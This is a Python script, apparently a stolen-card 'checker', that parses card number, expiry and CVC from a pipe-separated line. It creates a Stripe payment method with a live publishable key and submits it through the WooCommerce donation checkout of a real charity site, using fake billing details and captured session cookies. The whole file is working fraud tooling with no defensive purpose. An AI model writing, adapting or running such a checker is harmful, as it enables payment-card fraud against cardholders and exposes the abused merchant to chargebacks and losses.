import requests

def Tele(ccx):
    import requests
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:  # Mo3gza
        yy = yy.split("20")[1]
    
    r = requests.session()

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&billing_details[name]=waznim+ey&billing_details[address][line1]=street+27&billing_details[address][state]=NY&billing_details[address][city]=newyork&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[email]=waznimey%40gmail.com&billing_details[phone]=2095455155&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fb792108426%3B+stripe-js-v3%2Fb792108426%3B+split-card-element&key=pk_live_51MsXThLn2LtYJmrYT2Re6jHKRj0Q7pQryN6kUw2Sk53zp2mOvNfIowk15IrT1gznMKBG1q1nSOqEDupg6zt33Zyn00LORy0iqj'

    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    pm = r1.json()['id']

    cookies = {
    'wp_woocommerce_session_fb9067bf2bd9a3b3ccef4307db7f3b0a': 't_16a1f16504b030d68932f34d33728c%7C%7C1734003318%7C%7C1733999718%7C%7C1fa61e98c5a4a35e6a1ad5f2b62ec5b9',
    'et-editor-available-post-10-fb': 'fb',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '7af0e1fe87300d3f34677c2fe543ea89',
    '__stripe_mid': '6435b6e6-38c6-4f3a-a130-9180662e73fcbf70a7',
    '__stripe_sid': 'fecd519a-09b2-45a6-a121-cd9839c0a60b9a8f97',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'wp_woocommerce_session_fb9067bf2bd9a3b3ccef4307db7f3b0a=t_16a1f16504b030d68932f34d33728c%7C%7C1734003318%7C%7C1733999718%7C%7C1fa61e98c5a4a35e6a1ad5f2b62ec5b9; et-editor-available-post-10-fb=fb; woocommerce_items_in_cart=1; woocommerce_cart_hash=7af0e1fe87300d3f34677c2fe543ea89; __stripe_mid=6435b6e6-38c6-4f3a-a130-9180662e73fcbf70a7; __stripe_sid=fecd519a-09b2-45a6-a121-cd9839c0a60b9a8f97',
    'origin': 'https://wecaretocoach.com',
    'priority': 'u=1, i',
    'referer': 'https://wecaretocoach.com/donate/',
    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'wc-ajax': 'checkout',
}

    data = {
    'billing_first_name': 'waznim',
    'billing_last_name': 'ey',
    'billing_company': 'waznimey',
    'billing_country': 'US',
    'billing_address_1': 'street 27',
    'billing_address_2': '',
    'billing_city': 'Newyork',
    'billing_state': 'NY',
    'billing_postcode': '10080',
    'billing_phone': '+12014584566',
    'billing_email': 'waznimey2022@gmail.com',
    'payment_method': 'stripe',
    'woocommerce-process-checkout-nonce': '59ebbcf536',
    '_wp_http_referer': '/?wc-ajax=update_order_review',
    'stripe_source': pm,
}

    r2 = requests.post('https://wecaretocoach.com/', params=params, cookies=cookies, headers=headers, data=data)
    
    return r2.json()
